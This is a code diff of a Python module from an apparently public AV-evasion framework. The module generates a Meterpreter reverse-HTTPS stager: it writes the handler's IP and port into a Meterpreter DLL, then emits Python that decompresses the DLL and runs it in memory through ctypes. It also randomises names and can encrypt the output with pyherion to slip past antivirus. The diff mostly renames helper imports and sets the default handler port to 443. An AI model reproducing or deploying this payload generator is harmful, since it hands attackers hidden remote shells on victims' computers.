@@ -11,9 +11,8 @@ Concept and module by @the_grayhound
 
 import struct, string, random, sys, os
 
-from modules.common import randomizer
 from modules.common import helpers
-from modules.common import crypters
+from modules.common import encryption
 
 import settings
 
@@ -29,10 +28,10 @@ class Payload:
         
         # options we require user interaction for- format is {Option : [Value, Description]]}
         self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
-                                "use_pyherion" : ["N", "Use the pyherion encrypter"],
-                                "inject_method" : ["virtual", "[virtual]alloc or [void]pointer"],
-                                "LHOST" : ["", "IP of the metasploit handler"],
-                                "LPORT" : ["", "Port of the metasploit handler"]}
+                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
+                                 "inject_method" : ["virtual", "[virtual]alloc or [void]pointer"],
+                                 "LHOST" : ["", "IP of the metasploit handler"],
+                                 "LPORT" : ["443", "Port of the metasploit handler"]}
         
         
     # helper for the metasploit http checksum algorithm
@@ -87,7 +86,7 @@ class Payload:
 
         # replace the URL/port of the handler
         urlIndex = meterpreterDll.index("https://" + ("X" * 256))
-        urlString = "https://" + self.required_options['LHOST'][0] + ":" + str(self.required_options['LPORT'][0]) + "/" + self.genHTTPChecksum() + "_" + randomizer.randomString(16) + "/\x00"
+        urlString = "https://" + self.required_options['LHOST'][0] + ":" + str(self.required_options['LPORT'][0]) + "/" + self.genHTTPChecksum() + "_" + helpers.randomString(16) + "/\x00"
         meterpreterDll = dllReplace(meterpreterDll,urlIndex,urlString)
         
         # replace the expiration timeout with the default value of 300
@@ -112,17 +111,17 @@ class Payload:
             # doing void * cast
             payloadCode += "from ctypes import *\nimport base64,zlib\n"
 
-            randInflateFuncName = randomizer.randomString()
-            randb64stringName = randomizer.randomString()
-            randVarName = randomizer.randomString()
+            randInflateFuncName = helpers.randomString()
+            randb64stringName = helpers.randomString()
+            randVarName = helpers.randomString()
 
             # deflate function
             payloadCode += "def "+randInflateFuncName+"("+randb64stringName+"):\n"
             payloadCode += "\t" + randVarName + " = base64.b64decode( "+randb64stringName+" )\n"
             payloadCode += "\treturn zlib.decompress( "+randVarName+" , -15)\n"
 
-            randVarName = randomizer.randomString()
-            randFuncName = randomizer.randomString()
+            randVarName = helpers.randomString()
+            randFuncName = helpers.randomString()
             
             payloadCode += randVarName + " = " + randInflateFuncName + "(\"" + compressedDll + "\")\n"
             payloadCode += randFuncName + " = cast(" + randVarName + ", CFUNCTYPE(c_void_p))\n"
@@ -133,12 +132,12 @@ class Payload:
 
             payloadCode += 'import ctypes,base64,zlib\n'
 
-            randInflateFuncName = randomizer.randomString()
-            randb64stringName = randomizer.randomString()
-            randVarName = randomizer.randomString()
-            randPtr = randomizer.randomString()
-            randBuf = randomizer.randomString()
-            randHt = randomizer.randomString()
+            randInflateFuncName = helpers.randomString()
+            randb64stringName = helpers.randomString()
+            randVarName = helpers.randomString()
+            randPtr = helpers.randomString()
+            randBuf = helpers.randomString()
+            randHt = helpers.randomString()
 
             # deflate function
             payloadCode += "def "+randInflateFuncName+"("+randb64stringName+"):\n"
@@ -154,6 +153,6 @@ class Payload:
 
         
         if self.required_options["use_pyherion"][0].lower() == "y":
-            payloadCode = crypters.pyherion(payloadCode)
+            payloadCode = encryption.pyherion(payloadCode)
 
         return payloadCode
